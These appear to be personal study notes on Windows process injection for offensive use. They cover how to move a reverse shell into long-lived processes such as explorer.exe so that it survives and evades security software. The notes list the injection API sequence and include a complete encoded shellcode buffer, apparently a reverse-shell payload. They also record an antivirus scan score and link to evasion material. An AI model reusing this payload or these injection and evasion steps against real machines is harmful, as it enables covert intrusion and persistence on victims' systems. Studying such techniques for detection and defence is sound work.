http://www.pinvoke.net/

# Process Injection

This is the reference to any .net reference for visual studio.

When obtaining a reverse shell, be it a Meterpreter, regular command shell, or a shell from 
another framework, it must execute within a process. A typical shellcode runner (like those we 
developed in Microsoft Word, PowerShell, and Jscript) executes the shell inside its own process.
There are potential issues with this approach. First, the victim may close the application, which 
could shut down our shell. Second, security software may detect network communication from a 
process that normally doesn’t generate it and block our shell.
One way to overcome these challenges is with process injection or process migration. In this 
module, we’ll discuss these concepts and demonstrate various implementation techniques.

## finding a home for shellcode 

To extend the longevity of our implant, we can execute it in a process that is unlikely to terminate.
One such process is explorer.exe, which is responsible for hosting the user’s desktop experience. 
We could also inject into a new hidden process like notepad.exe, or we could migrate to a process 
like svchost.exe that performs network communication

Process vs thread

By definition, a process is a container that is created to house a running application. Each 
Windows process maintains its own virtual memory space. Although these spaces are not meant 
to directly interact with one another, we may be able to accomplish this with various Win32 APIs.
On the other hand, a thread executes the compiled assembly code of the application. A process 
may have multiple threads to perform simultaneous actions and each thread will have its own 
stack and shares the virtual memory space of the process

OpenProcess to open a process
VirtualAllocEx to allocate virtual memory
WriteProcessMemory to write to the allocated space
CreateRemoteThread to execute thread under the remote process

We will discuss these APIs in more detail in the next section, but we need to take a moment to 
discuss security permissions. The OpenProcess API opens an existing local process for 
interaction and must be supplied with three parameters. The first argument, dwDesiredAccess, 
establishes the access rights245 we require on that process. Let’s take a moment to discuss these 
access rights.
To call OpenProcess successfully, our current process must possess the appropriate security 
permissions. Every process has a Security Descriptor246 that specifies the file permissions of the 
executable and access rights of a user or group, originating from the creator of the process. This 
can effectively block privilege elevation.
All processes also have an Integrity level247 that restricts access to it. This works by blocking 
access from one process to another that has a higher Integrity level, however accessing a 
process with a lower Integrity level is generally possible.

opening notepad properties as user from procexp
difference in integrity level: 

![](notepad_permissions.png)

### creating a code based injection

```
unsigned char buf[] =                                                                                                                                                                                                                    
"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"                                                                                                                                                                           
"\xff\xff\x48\xbb\x12\xf5\x6a\xb2\xc8\xd7\x9c\xae\x48\x31\x58"                                                                                                                                                                           
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xee\xbd\xe9\x56\x38\x3f"                                                                                                                                                                           
"\x5c\xae\x12\xf5\x2b\xe3\x89\x87\xce\xff\x44\xbd\x5b\x60\xad"                                                                                                                                                                           
"\x9f\x17\xfc\x72\xbd\xe1\xe0\xd0\x9f\x17\xfc\x32\xbd\xe1\xc0"                                                                                                                                                                           
"\x98\x9f\x93\x19\x58\xbf\x27\x83\x01\x9f\xad\x6e\xbe\xc9\x0b"
"\xce\xca\xfb\xbc\xef\xd3\x3c\x67\xf3\xc9\x16\x7e\x43\x40\xb4"
"\x3b\xfa\x43\x85\xbc\x25\x50\xc9\x22\xb3\x18\x5c\x1c\x26\x12"
"\xf5\x6a\xfa\x4d\x17\xe8\xc9\x5a\xf4\xba\xe2\x43\x9f\x84\xea"
"\x99\xb5\x4a\xfb\xc9\x07\x7f\xf8\x5a\x0a\xa3\xf3\x43\xe3\x14"
"\xe6\x13\x23\x27\x83\x01\x9f\xad\x6e\xbe\xb4\xab\x7b\xc5\x96"
"\x9d\x6f\x2a\x15\x1f\x43\x84\xd4\xd0\x8a\x1a\xb0\x53\x63\xbd"
"\x0f\xc4\xea\x99\xb5\x4e\xfb\xc9\x07\xfa\xef\x99\xf9\x22\xf6"
"\x43\x97\x80\xe7\x13\x25\x2b\x39\xcc\x5f\xd4\xaf\xc2\xb4\x32"
"\xf3\x90\x89\xc5\xf4\x53\xad\x2b\xeb\x89\x8d\xd4\x2d\xfe\xd5"
"\x2b\xe0\x37\x37\xc4\xef\x4b\xaf\x22\x39\xda\x3e\xcb\x51\xed"
"\x0a\x37\xfb\x76\xa0\xef\x9c\x4d\xc6\x58\xb2\xc8\x96\xca\xe7"
"\x9b\x13\x22\x33\x24\x77\x9d\xae\x12\xbc\xe3\x57\x81\x6b\x9e"
"\xae\x03\xa9\x60\xb8\xce\xdd\xdd\xfa\x5b\x7c\x8e\xfe\x41\x26"
"\xdd\x14\x5e\x82\x4c\xb5\x37\x02\xd0\x27\xf8\x9d\x6b\xb3\xc8"
"\xd7\xc5\xef\xa8\xdc\xea\xd9\xc8\x28\x49\xfe\x42\xb8\x5b\x7b"
"\x85\xe6\x5c\xe6\xed\x35\x22\x3b\x0a\x9f\x63\x6e\x5a\x7c\xab"
"\xf3\x72\x3d\x93\x71\xf2\x0a\xbf\xfa\x41\x10\xf6\xbe\x53\xad"
"\x26\x3b\x2a\x9f\x15\x57\x53\x4f\xf3\x17\xbc\xb6\x63\x7b\x5a"
"\x74\xae\xf2\xca\xd7\x9c\xe7\xaa\x96\x07\xd6\xc8\xd7\x9c\xae"
"\x12\xb4\x3a\xf3\x98\x9f\x15\x4c\x45\xa2\x3d\xff\xf9\x17\xf6"
"\xa3\x4b\xb4\x3a\x50\x34\xb1\x5b\xea\x36\xa1\x6b\xb3\x80\x5a"
"\xd8\x8a\x0a\x33\x6a\xda\x80\x5e\x7a\xf8\x42\xb4\x3a\xf3\x98"
"\x96\xcc\xe7\xed\x35\x2b\xe2\x81\x28\x54\xe3\x9b\x34\x26\x3b"
"\x09\x96\x26\xd7\xde\xca\xec\x4d\x1d\x9f\xad\x7c\x5a\x0a\xa0"
"\x39\xc6\x96\x26\xa6\x95\xe8\x0a\x4d\x1d\x6c\x6c\x1b\xb0\xa3"
"\x2b\x08\x6e\x42\x21\x33\xed\x20\x22\x31\x0c\xff\xa0\xa8\x6e"
"\xff\xea\x49\x28\xa2\x99\x15\x55\xe6\x18\xdd\xa2\xd7\xc5\xef"
"\x9b\x2f\x95\x67\xc8\xd7\x9c\xae";

```

Using mingw compiler https://www.msys2.org/


https://code.visualstudio.com/docs/cpp/config-mingw#:~:text=From%20the%20main%20menu%2C%20choose%20Run%20%3E%20Add%20Configuration..,build%20and%20debug%20active%20file. 

cttrl + shift + b - to build

with the pe injection it works from here - 

https://www.ired.team/offensive-security/code-injection-process-injection/process-injection

scan result 5/26

Trying to evade the AV we have - https://0xhop.github.io/evasion/2021/04/19/evasion-pt1/








